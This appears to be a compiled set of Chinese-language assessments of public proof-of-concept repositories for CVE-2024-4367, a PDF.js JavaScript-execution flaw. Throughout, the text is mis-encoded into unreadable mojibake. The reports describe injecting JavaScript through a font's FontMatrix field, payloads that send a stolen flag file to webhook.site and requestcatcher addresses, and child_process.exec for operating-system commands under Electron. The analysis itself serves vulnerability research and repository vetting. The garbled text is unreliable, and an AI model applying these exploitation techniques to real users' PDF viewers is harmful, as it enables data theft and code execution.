CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

